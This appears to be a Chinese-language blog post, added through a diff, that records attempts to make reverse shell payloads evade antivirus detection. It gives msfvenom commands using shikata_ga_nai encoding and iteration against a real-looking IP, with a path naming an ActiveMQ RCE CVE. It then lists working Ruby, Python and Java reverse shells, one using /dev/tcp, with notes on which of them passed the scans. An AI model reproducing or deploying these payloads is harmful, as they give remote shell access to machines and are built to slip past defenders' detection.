@@ -1,0 +1,241 @@
+<p>refer to: <br /><a href="https://www.cyberpratibha.com/blog/msfvenom-replacement-of-msfpayload-and-msfencode-full-guide/ " target="_blank">https://www.cyberpratibha.com/blog/msfvenom-replacement-of-msfpayload-and-msfencode-full-guide/</a>
+</p>
+<p>msfencode&#160; msfpayload 已经在2015年被干掉了</p>
+<p>用msfvenom 就好了</p>
+<p>今天生成了一个 reverse shell 的 文件，结果发现完全不免杀：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_174839.png" /></p>
+<p>原始命令：</p>
+<p>略。</p>
+<p>最简单的例子：（加上了 -b '/x00'）</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 -b ‘/x00’ -f exe &gt; root/Desktop/trojan.exe</p>
+<p>稍微好一点的例子： （使用了 -e x86/shikata_gainai -i5 ) ）</p>
+<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=47.242.241.247 LPORT=2222 -f elf -o /workspace/hacker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/test005_encode_shikata_i10.elf  -e x86/shikata_ga_nai. -i 5</p>
+<p>encode 完整列表：</p>
+<pre>_@DESKTOP-GG23M21-wsl- metasploit-framework$ msfvenom -l encoder
+
+Framework Encoders [--encoder ]
+======================================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/brace                     low        Bash Brace Expansion Command Encoder
+    cmd/echo                      good       Echo Command Encoder
+    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
+    cmd/perl                      normal     Perl Command Encoder
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/eicar                 manual     The EICAR Encoder
+    generic/none                  normal     The "none" Encoder
+    mipsbe/byte_xori              normal     Byte XORi Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/byte_xori              normal     Byte XORi Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    ruby/base64                   great      Ruby Base64 Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
+    x64/xor_dynamic               normal     Dynamic key XOR Encoder
+    x64/zutto_dekiru              manual     Zutto Dekiru
+    x86/add_sub                   manual     Add/Sub Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/bmp_polyglot              manual     BMP Polyglot
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/opt_sub                   manual     Sub Encoder (optimised)
+    x86/service                   manual     Register Service
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+    x86/xor_dynamic               normal     Dynamic key XOR Encoder
+    x86/xor_poly                  normal     XOR POLY Encoder<br /><br /><br />
+</pre>
+<p>下面是具体的过程：</p>
+<p>1. 未作任何encode&#160;&#160; 32/63</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182051.png" /></p>
+<p>2. 使用 -b '/x00'</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182135.png" /></p>
+<p>3. 使用了 -e x86/shikata_</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182214.png" /></p>
+<p>4. 在上面基础上，增加 -i 5</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182248.png" /></p>
+<p>5.&#160; i 5 变为 i 10</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182316.png" /></p>
+<p>6. i5 外加 -b </p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182335.png" /></p>
+<p>7. 使用 ruby/base64 </p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182353.png" /></p>
+<p>8. ruby/base64 i5&#160; 可以看到， 只剩下一个了。</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231207_182437.png" /></p>
+<p>9. 使用 elf 格式的都不可以。 </p>
+<p>所以尝试使用其他的payload: </p>
+<p>msfvenom -p cmd/unix/reverse_perl LHOST=47.242.241.247 LPORT=2222 -f perl -o /workspace/hacker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/test006_perl_2.pl</p>
+<p>10. perl的这个是很完美的，可惜无法使用：（还是我不会用？）</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_080342.png" /></p>
+<pre>my $buf =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" .
+"\x48\xb9\x02\x00\x08\xae\x2f\xf2\xf1\xf7\x51\x48\x89\xe6" .
+"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" .
+"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f" .
+"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48" .
+"\x89\xe6\x0f\x05";
+</pre>
+<p>看起来是只声明了string， 并没有执行</p>
+<p>可是增加了eval代码之后，仍然不行。</p>
+<p>11. 使用ruby的，不要使用msf生成：</p>
+<p><a href="https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325 " target="_blank">https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325</a>
+</p>
+<pre>#!/usr/bin/env ruby
+# syscall 33 = dup2 on 64-bit Linux  # 这里是系统的ID
+# syscall 63 = dup2 on 32-bit Linux
+# test with nc -lvp 1337
+
+require 'socket'
+
+s = Socket.new 2,1
+s.connect Socket.sockaddr_in 1337, '127.0.0.1'   # 1337 端口号， 后面的是IP，替换即可。
+
+[0,1,2].each { |fd| syscall 33, s.fileno, fd }
+exec '/bin/sh -i'
+</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_095907.png" /></p>
+<p>12. 继续使用ruby的。 没在MSF上找。也可以了: </p>
+<p><a href="https://github.com/secjohn/ruby-shells/blob/master/revshell.rb " target="_blank">https://github.com/secjohn/ruby-shells/blob/master/revshell.rb</a>
+</p>
+<pre>#!/usr/bin/env ruby
+
+require 'socket'
+require 'open3'
+
+#Set the Remote Host IP
+RHOST = "192.168.1.10"
+#Set the Remote Host Port
+PORT = "6667"
+
+#Tries to connect every 20 sec until it connects.
+begin
+sock = TCPSocket.new "#{RHOST}", "#{PORT}"
+sock.puts "We are connected!"
+rescue
+  sleep 20
+  retry
+end
+
+#Runs the commands you type and sends you back the stdout and stderr.
+begin
+  while line = sock.gets
+    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+              IO.copy_stream(stdout_and_stderr, sock)
+              end
+  end
+rescue
+  retry
+end </pre>
+<p>13. 继续ruby ... 仍然可以&#160; <br /><a href="https://github.com/Nathalon/kai/blob/main/kai.rb " target="_blank">https://github.com/Nathalon/kai/blob/main/kai.rb</a>
+</p>
+<pre>require 'socket'
+  def connect
+    ip = "XX.242.241.247"
+    port = "2222"   #注意这里必须是双引号，不能是int
+    socket = TCPSocket.new(ip, port)
+    while (cmd = socket.gets)
+      IO.popen(cmd, 'r') { |io| socket.print io.read }
+    end
+  end
+connect
+</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_100520.png" /></p>
+<p>14. python: </p>
+<p><a href="https://www.linuxfordevices.com/tutorials/shell-script/reverse-shell-in-python " target="_blank">https://www.linuxfordevices.com/tutorials/shell-script/reverse-shell-in-python</a>
+</p>
+<pre>#!/usr/bin/python3
+from os import dup2
+from subprocess import run
+import socket
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("xx.242.241.247", 2222))   # 后面这个必须是数字，不能是字符串
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+run(["/bin/bash","-i"])
+</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_103504.png" /></p>
+<p>15. 继续python: </p>
+<pre>import pty;
+import socket,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("xx.242.241.247", 2222))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")</pre>
+<p><a href="https://blog.finxter.com/python-one-line-reverse-shell/ " target="_blank">https://blog.finxter.com/python-one-line-reverse-shell/</a>
+</p>
+<p>可惜这个有2个没过</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_104727.png" /></p>
+<p>16. 换成java: </p>
+<p><a href="https://www.revshells.com/ " target="_blank">https://www.revshells.com/</a>
+</p>
+<pre>public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i &gt;&amp; /dev/tcp/xxx.242.241.247/2222 0&gt;&amp;1")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_105137.png" /></p>
+<p>17. 继续java: </p>
+<pre>import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class shell {
+    public static void main(String[] args) {
+        String host = "xx.242.241.247";
+        int port = 2222;
+        String cmd = "sh";
+        try {
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while (!s.isClosed()) {
+                while (pi.available() &gt; 0)
+                    so.write(pi.read());
+                while (pe.available() &gt; 0)
+                    so.write(pe.read());
+                while (si.available() &gt; 0)
+                    po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {}
+    }
+}</pre>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20231208_110216.png" /></p>
